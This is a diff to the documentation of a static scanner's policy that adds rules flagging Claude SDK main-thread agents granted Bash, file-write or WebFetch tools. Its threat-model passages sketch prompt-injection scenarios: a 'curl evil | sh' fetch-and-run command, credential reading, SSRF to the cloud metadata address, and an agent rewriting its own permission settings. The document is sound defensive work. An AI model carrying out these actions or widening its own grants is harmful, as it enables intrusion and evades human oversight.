@@ -33,6 +33,16 @@ rules:
     confidence: 0.9
     scope: agent
     fix_type: config
+  - id: CSDK-130
+    severity: high
+    confidence: 0.8
+    scope: agent
+    fix_type: config
+  - id: CSDK-131
+    severity: high
+    confidence: 0.75
+    scope: agent
+    fix_type: config
 references: [LLM01, LLM06]
 ---
 
@@ -40,9 +50,9 @@ references: [LLM01, LLM06]
 
 **Policy ID:** `claude_sdk_agent_safety`  
 **File:** `claude_sdk/agent_safety.yaml`  
-**Rules:** CSDK-101, CSDK-102, CSDK-103, CSDK-104, CSDK-105, CSDK-120  
-**Severities:** high, high, high, high, high, high  
-**Fix types:** config, config, config, config, config, config  
+**Rules:** CSDK-101, CSDK-102, CSDK-103, CSDK-104, CSDK-105, CSDK-120, CSDK-130, CSDK-131  
+**Severities:** high, high, high, high, high, high, high, high  
+**Fix types:** config, config, config, config, config, config, config, config  
 **References:** LLM01, LLM06
 
 ---
@@ -57,6 +67,13 @@ agent) and inspect the `tools` list and `permissionMode` kwarg: CSDK-101 grants
 built-in (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`); CSDK-105 grants
 `WebFetch`. The predicates are `agent_grants_builtin_tool` (string match against
 the declared tools) and `agent_kwarg_value` (for permissionMode).
+
+Two TypeScript rules in this file fire against a different agent shape: the
+`query(...)` **main agent thread** (discovery kind `claude_query_main`), not an
+`AgentDefinition`. CSDK-130 flags `Bash` in the main thread's
+`options.allowedTools`; CSDK-131 flags a filesystem-write built-in or `WebFetch`
+there. Both read `AgentDef.ToolRefs` via the same `agent_grants_builtin_tool`
+predicate the AgentDefinition rules use.
 
 ---
 
@@ -230,6 +247,93 @@ Python sibling CSDK-103's 0.9. A false negative remains for the session-level
 `permissionMode` set on `ClaudeAgentOptions`/`query(...)` rather than on the
 `AgentDefinition` — that is a separate detection surface, not covered here.
 
+### CSDK-130 — TypeScript query() main agent is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)
+
+**What we detect:**
+A `query(...)` call whose `options.allowedTools` contains `Bash`
+(`agent_grants_builtin_tool: [Bash]`, matched against the `query()` main agent's
+resolved `ToolRefs`). Discovery models the `query(...)` main thread as an
+`AgentDef` of kind `claude_query_main`, so this is the same string-grant check
+CSDK-101 runs on an `AgentDefinition`, pointed at the top-level thread instead of
+a subagent.
+
+**Why it is flaggable:**
+`Bash` on the main thread is arbitrary shell execution that acts directly on model
+output in the conversation loop — there is no subagent boundary between a
+prompt-injected instruction and the OS shell, and `AgentDefinition`/`.claude/agents`
+inspection never sees the `query()` thread, so nothing else covers this grant.
+
+**Real-world consequence:**
+A main-thread agent given `Bash` is steered by an injected instruction (from a
+file it read, a tool result, or user input) into running `curl evil | sh` or
+reading credentials, unattended — the broadest privilege a Claude TypeScript agent
+can hold.
+
+**Why severity is high and not medium:**
+Shell access on the directly-driven main thread is maximal agency with the
+shortest possible path from untrusted input to a real command. Not critical only
+because exploitation still requires the thread to be driven to it. Matches the
+Python/subagent sibling CSDK-101's high.
+
+**Fix type — config:**
+Removing `Bash` from `options.allowedTools`, or gating it with a PreToolUse hook,
+is a wiring change on the `query()` options, not a change to any tool's source.
+
+**Confidence 0.8:**
+A main thread may legitimately need shell (a developer-facing coding agent); the
+grant alone cannot distinguish a justified `Bash` from an over-broad one, exactly
+as for CSDK-101 — hence 0.8. The residual false negative is a `Bash` grant supplied
+through a non-literal `allowedTools` (a variable the static read cannot resolve to
+the constructor).
+
+### CSDK-131 — TypeScript query() main agent is granted filesystem-write or web-fetch built-ins (Severity: high, Confidence: 0.75, Fix type: config)
+
+**What we detect:**
+A `query(...)` main agent whose `options.allowedTools` contains a filesystem-write
+built-in (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) or `WebFetch`
+(`agent_grants_builtin_tool` against the five names, read off the
+`claude_query_main` agent's `ToolRefs`). It collapses the write-built-in concern of
+the Python sibling CSDK-104 and the `WebFetch` concern of CSDK-105 into one rule on
+the main thread.
+
+**Why it is flaggable:**
+On the main thread these run with no subagent boundary and no SDK guardrail
+mechanism. Write access lets a prompt-injected main agent rewrite source,
+configuration, or the `.claude/settings.json` that governs its own permissions —
+self-amplifying, comparable blast radius to shell. `WebFetch` pulls a model-chosen
+URL's content straight back into the loop, which is both a prompt-injection
+re-entry (attacker page content becomes context) and a server-side request forgery
+surface (the URL can point at internal/metadata addresses).
+
+**Real-world consequence:**
+A main-thread agent with `Write` rewrites a config to widen its own grants during
+an autonomous task; one with `WebFetch` is steered to fetch
+`http://169.254.169.254/...` (SSRF to cloud metadata) or an attacker page whose
+content carries follow-on instructions.
+
+**Why severity is high and not medium:**
+It bundles two high-impact grants — self-amplifying write and the
+injection-plus-SSRF fetch — on the directly-driven thread with no mediation.
+Matches the high severity of both Python siblings (CSDK-104/105). Not critical
+because a trigger is still required.
+
+**Fix type — config:**
+Dropping the write/fetch built-ins from `options.allowedTools`, scoping writes to a
+working directory, or gating with a PreToolUse hook are wiring changes on the
+`query()` options, not tool-source edits.
+
+**Confidence 0.75:**
+Lower than CSDK-130's 0.8 because the rule unions two capability classes, widening
+the legitimate-use surface: a coding agent that genuinely needs `Write`, or a
+research agent that genuinely needs `WebFetch`, both fire on a grant that may be
+intended — the rule flags the grant for review, it does not prove misuse. This
+mirrors CSDK-105's own 0.75 for the fetch case. **False positives:** a justified
+write or fetch grant, or one already gated by a PreToolUse hook the static check
+cannot see. **False negatives:** a grant supplied through a non-literal
+`allowedTools` value, and any of these capabilities delivered through a custom
+(non-built-in) tool wired into the thread, which the built-in-name match does not
+cover.
+
 ---
 
 ## What this policy does not cover
@@ -244,6 +348,10 @@ Python sibling CSDK-103's 0.9. A false negative remains for the session-level
   static grant check cannot see (a false positive).
 - The `permissionMode` set at the `ClaudeAgentOptions` session level rather than on
   the AgentDefinition — that is CSDK-202 (see [repo.md](repo.md)).
+- For CSDK-130/131: a built-in granted to the `query()` main thread through a
+  non-literal `options.allowedTools` (a variable the static read cannot resolve),
+  and any of these capabilities delivered through a custom (non-built-in) tool —
+  the grant check matches the built-in tool names only.
 
 ---
 
